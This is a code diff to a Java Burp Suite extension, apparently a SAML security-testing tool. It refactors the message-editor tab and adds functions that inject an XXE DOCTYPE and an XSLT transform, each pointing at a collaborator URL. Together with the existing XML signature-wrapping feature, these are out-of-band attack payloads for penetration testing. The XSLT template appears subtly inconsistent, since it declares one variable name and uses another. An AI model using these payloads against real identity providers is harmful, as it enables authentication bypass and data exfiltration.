@@ -7,14 +7,11 @@ import gui.XSWHelpWindow;
 import helpers.HTTPHelpers;
 import helpers.XMLHelpers;
 import helpers.XSWHelpers;
-
 import java.awt.Component;
 import java.awt.Desktop;
 import java.awt.Toolkit;
 import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.StringSelection;
-import java.awt.event.KeyEvent;
-import java.awt.event.KeyListener;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
@@ -27,36 +24,37 @@ import java.net.URLEncoder;
 import java.security.NoSuchAlgorithmException;
 import java.security.cert.CertificateException;
 import java.security.spec.InvalidKeySpecException;
+import java.util.HashMap;
 import java.util.List;
 import java.util.Observable;
 import java.util.Observer;
 import java.util.zip.DataFormatException;
-
-import javax.swing.JTextArea;
 import javax.xml.crypto.MarshalException;
 import javax.xml.crypto.dsig.XMLSignatureException;
 import javax.xml.parsers.ParserConfigurationException;
-
 import model.BurpCertificate;
-
 import org.w3c.dom.DOMException;
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
 import org.w3c.dom.Node;
 import org.w3c.dom.NodeList;
 import org.xml.sax.SAXException;
-
 import burp.IBurpExtenderCallbacks;
 import burp.IExtensionHelpers;
 import burp.IMessageEditorTab;
 import burp.IParameter;
 import burp.IRequestInfo;
 import burp.IResponseInfo;
+import burp.ITextEditor;
 
 public class SamlTabController implements IMessageEditorTab, Observer {
 
 	private static final String XML_CERTIFICATE_NOT_FOUND = "X509 Certificate not found";
 	private static final String XSW_ATTACK_APPLIED = "XSW Attack applied";
+	private static final String XXE_CONTENT_APPLIED = "XXE content applied";
+	private static final String XML_NOT_SUITABLE_FOR_XXE = "This XML Message is not suitable for this particular XXE attack";
+	private static final String XSLT_CONTENT_APPLIED = "XSLT content applied";
+	private static final String XML_NOT_SUITABLE_FOR_XLST = "This XML Message is not suitable for this particular XLST attack";
 	private static final String XML_COULD_NOT_SIGN = "Could not sign XML";
 	private static final String XML_COULD_NOT_SERIALIZE = "Could not serialize XML";
 	private static final String XML_NOT_WELL_FORMED = "XML isn't well formed or binding is not supported";
@@ -65,6 +63,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 	private static final String NO_DIFF_TEMP_FILE = "Could not create diff temp file.";
 
 	private IExtensionHelpers helpers;
+	private final IBurpExtenderCallbacks callbacks;
 	private XMLHelpers xmlHelpers;
 	private byte[] message;
 	private String orgSAMLMessage;
@@ -72,10 +71,9 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 	private boolean isInflated = true;
 	private boolean isGZip = false;
 	private boolean isWSSUrlEncoded = false;
-	private JTextArea textArea;
+	private ITextEditor textArea;
 	private SamlMain samlGUI;
 	private boolean editable;
-	private boolean edited;
 	private boolean isSOAPMessage;
 	private boolean isWSSMessage;
 	private boolean isSAMLRequest; // otherwise it's a SAMLResponse
@@ -83,16 +81,16 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 	private CertificateTabController certificateTabController;
 	private XSWHelpers xswHelpers;
 	private HTTPHelpers httpHelpers;
+	private boolean isEdited = false;
 
 	public SamlTabController(IBurpExtenderCallbacks callbacks, boolean editable,
 			CertificateTabController certificateTabController) {
 		this.editable = editable;
+		this.callbacks = callbacks;
 		this.helpers = callbacks.getHelpers();
 		samlGUI = new SamlMain(this);
 		textArea = samlGUI.getTextArea();
-		addTextAreaKeyListener();
 		textArea.setEditable(editable);
-		textArea.setEnabled(true);
 		xmlHelpers = new XMLHelpers();
 		xswHelpers = new XSWHelpers();
 		httpHelpers = new HTTPHelpers();
@@ -100,28 +98,10 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 		this.certificateTabController.addObserver(this);
 	}
 
-	private void addTextAreaKeyListener() {
-		textArea.addKeyListener(new KeyListener() {
-
-			@Override
-			public void keyTyped(KeyEvent arg0) {
-			}
-
-			@Override
-			public void keyReleased(KeyEvent arg0) {
-			}
-
-			@Override
-			public void keyPressed(KeyEvent arg0) {
-				edited = true;
-			}
-		});
-	}
-
 	@Override
 	public byte[] getMessage() {
 		byte[] byteMessage = message;
-		if (edited) {
+		if (isModified()) {
 			if (isSOAPMessage) {
 				try {
 					// TODO Only working with getString for both documents,
@@ -151,7 +131,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 
 				try {
 					textMessage = xmlHelpers
-							.getStringOfDocument(xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getText()), 0, true);
+							.getStringOfDocument(xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText())), 0, true);
 				} catch (IOException e) {
 					setInfoMessageText(XML_COULD_NOT_SERIALIZE);
 				} catch (SAXException e) {
@@ -160,9 +140,9 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 
 				String parameterToUpdate;
 				if (isSAMLRequest) {
-					parameterToUpdate = "SAMLRequest";
+					parameterToUpdate = certificateTabController.getSamlRequestParameterName();
 				} else {
-					parameterToUpdate = "SAMLResponse";
+					parameterToUpdate = certificateTabController.getSamlResponseParameterName();
 				}
 
 				if (isWSSMessage) {
@@ -186,11 +166,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 
 	@Override
 	public byte[] getSelectedData() {
-		try {
-			return (textArea.getSelectedText()).getBytes("UTF-8");
-		} catch (UnsupportedEncodingException e) {
-		}
-		return null;
+		return textArea.getSelectedText();
 	}
 
 	@Override
@@ -247,14 +223,12 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 			isSOAPMessage = false;
 
 			IParameter requestParameter;
-
-			requestParameter = helpers.getRequestParameter(content, "SAMLResponse");
+			requestParameter = helpers.getRequestParameter(content, certificateTabController.getSamlResponseParameterName());
 			if (requestParameter != null) {
 				isSAMLRequest = false;
 				return true;
 			}
-
-			requestParameter = helpers.getRequestParameter(content, "SAMLRequest");
+			requestParameter = helpers.getRequestParameter(content, certificateTabController.getSamlRequestParameterName());
 			if (requestParameter != null) {
 				isSAMLRequest = true;
 				return true;
@@ -265,13 +239,13 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 
 	@Override
 	public boolean isModified() {
-		return edited;
+		return textArea.isTextModified() || isEdited;
 	}
 
 	@Override
 	public void setMessage(byte[] content, boolean isRequest) {
 		resetInfoMessageText();
-		edited = false;
+		isEdited = false;
 		if (content == null) {
 			textArea.setText(null);
 			textArea.setEditable(false);
@@ -294,9 +268,9 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 					IParameter parameter;
 
 					if (isSAMLRequest) {
-						parameter = helpers.getRequestParameter(content, "SAMLRequest");
+						parameter = helpers.getRequestParameter(content, certificateTabController.getSamlRequestParameterName());
 					} else {
-						parameter = helpers.getRequestParameter(content, "SAMLResponse");
+						parameter = helpers.getRequestParameter(content, certificateTabController.getSamlResponseParameterName());
 					}
 
 					if (null != parameter) {
@@ -320,7 +294,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 			updateCertificateList();
 			updateXSWList();
 			orgSAMLMessage = SAMLMessage;
-			textArea.setText(SAMLMessage);
+			textArea.setText(SAMLMessage.getBytes());
 			textArea.setEditable(editable);
 			setGUIEditable(editable);
 		}
@@ -432,11 +406,11 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 	public void removeSignature() {
 		resetInfoMessageText();
 		try {
-			Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getText());
+			Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText()));
 			if (xmlHelpers.removeAllSignatures(document) > 0) {
 				SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
-				textArea.setText(SAMLMessage);
-				edited = true;
+				textArea.setText(SAMLMessage.getBytes());
+				isEdited = true;
 				setInfoMessageText("Message signature successful removed");
 			} else {
 				setInfoMessageText("No Signatures available to remove");
@@ -450,8 +424,8 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 
 	public void resetMessage() {
 		SAMLMessage = orgSAMLMessage;
-		textArea.setText(SAMLMessage);
-		edited = false;
+		textArea.setText(SAMLMessage.getBytes());
+		isEdited = false;
 	}
 
 	public void resignAssertion() {
@@ -460,7 +434,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 			BurpCertificate cert = samlGUI.getActionPanel().getSelectedCertificate();
 			if (cert != null) {
 				setInfoMessageText("Signing...");
-				Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getText());
+				Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText()));
 				NodeList assertions = xmlHelpers.getAssertions(document);
 				String signAlgorithm = xmlHelpers.getSignatureAlgorithm(assertions.item(0));
 				String digestAlgorithm = xmlHelpers.getDigestAlgorithm(assertions.item(0));
@@ -472,8 +446,8 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 				xmlHelpers.signAssertion(doc, signAlgorithm, digestAlgorithm, cert.getCertificate(),
 						cert.getPrivateKey());
 				SAMLMessage = xmlHelpers.getStringOfDocument(doc, 2, true);
-				textArea.setText(SAMLMessage);
-				edited = true;
+				textArea.setText(SAMLMessage.getBytes());
+				isEdited = true;
 				setInfoMessageText("Assertions successfully signed");
 			} else {
 				setInfoMessageText("no certificate chosen to sign");
@@ -496,7 +470,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 				setInfoMessageText("Signing...");
 				BurpCertificate cert = samlGUI.getActionPanel().getSelectedCertificate();
 				if (cert != null) {
-					Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getText());
+					Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText()));
 					NodeList responses = xmlHelpers.getResponse(document);
 					String signAlgorithm = xmlHelpers.getSignatureAlgorithm(responses.item(0));
 					String digestAlgorithm = xmlHelpers.getDigestAlgorithm(responses.item(0));
@@ -505,8 +479,8 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 					xmlHelpers.signMessage(document, signAlgorithm, digestAlgorithm, cert.getCertificate(),
 							cert.getPrivateKey());
 					SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
-					textArea.setText(SAMLMessage);
-					edited = true;
+					textArea.setText(SAMLMessage.getBytes());
+					isEdited = true;
 					setInfoMessageText("Message successfully signed");
 				} else {
 					setInfoMessageText("no certificate chosen to sign");
@@ -548,7 +522,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 
 	public void sendToCertificatesTab() {
 		try {
-			Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getText());
+			Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText()));
 			String cert = xmlHelpers.getCertificate(document.getDocumentElement());
 			if (cert != null) {
 				certificateTabController.importCertificateFromString(cert);
@@ -603,8 +577,8 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 			document = xmlHelpers.getXMLDocumentOfSAMLMessage(orgSAMLMessage);
 			xswHelpers.applyXSW(samlGUI.getActionPanel().getSelectedXSW(), document);
 			SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
-			textArea.setText(SAMLMessage);
-			edited = true;
+			textArea.setText(SAMLMessage.getBytes());
+			isEdited = true;
 			setInfoMessageText(XSW_ATTACK_APPLIED);
 		} catch (SAXException e) {
 			setInfoMessageText(XML_NOT_WELL_FORMED);
@@ -613,6 +587,58 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 		} catch (DOMException | NullPointerException e) {
 			setInfoMessageText(XML_NOT_SUITABLE_FOR_XSW);
 		}
+	}
+	
+	public void applyXXE(String collabUrl) {
+		String dtd = "\n<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \""+collabUrl+"\"> %xxe; ]>";
+		String[] splitMsg = orgSAMLMessage.split("\\?>");
+		if(splitMsg.length != 2) {
+			setInfoMessageText(XML_NOT_SUITABLE_FOR_XXE);
+		}
+		else {
+			SAMLMessage = splitMsg[0]+"?>"+dtd+splitMsg[1];
+			textArea.setText(SAMLMessage.getBytes());
+			isEdited = true;
+			setInfoMessageText(XXE_CONTENT_APPLIED);
+		}
+	}
+
+	public void applyXSLT(String collabUrl) {
+		String xslt = "\n" +
+				"<ds:Transform>\n" +
+				"  <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n" +
+				"    <xsl:template match=\"doc\">\n" +
+				"      <xsl:variable name=\"file\" select=\"'test'\"/>\n" +
+				"      <xsl:variable name=\"escaped\" select=\"encode-for-uri('$file')\"/>" +
+				"      <xsl:variable name=\"attackURL\" select=\"'" + collabUrl + "'\"/>\n" +
+				"      <xsl:variable name=\"exploitURL\" select=\"concat($attackerURL,$escaped)\"/>\n" +
+				"      <xsl:value-of select=\"unparsed-text($exploitURL)\"/>\n" +
+				"    </xsl:template>\n" +
+				"  </xsl:stylesheet>\n" +
+				"</ds:Transform>";
+		String transformString = "<ds:Transforms>";
+		int index = orgSAMLMessage.indexOf(transformString);
+
+		if(index == -1) {
+			setInfoMessageText(XML_NOT_SUITABLE_FOR_XLST);
+		}
+		else {
+			int substringIndex = index + transformString.length();
+			String firstPart = orgSAMLMessage.substring(0, substringIndex);
+			String secondPart = orgSAMLMessage.substring(substringIndex);
+			SAMLMessage = firstPart + xslt + secondPart;
+			textArea.setText(SAMLMessage.getBytes());
+			isEdited = true;
+			setInfoMessageText(XSLT_CONTENT_APPLIED);
+		}		
+	}
+	
+	public synchronized void addMatchAndReplace(String match, String replace) {
+		XSWHelpers.MATCH_AND_REPLACE_MAP.put(match, replace);
+	}
+	
+	public synchronized HashMap<String, String> getMatchAndReplaceMap() {
+		return XSWHelpers.MATCH_AND_REPLACE_MAP;
 	}
 
 	public void setGUIEditable(boolean editable) {
@@ -636,5 +662,9 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 	@Override
 	public void update(Observable arg0, Object arg1) {
 		updateCertificateList();
+	}
+
+	public IBurpExtenderCallbacks getCallbacks() {
+		return callbacks;
 	}
 }
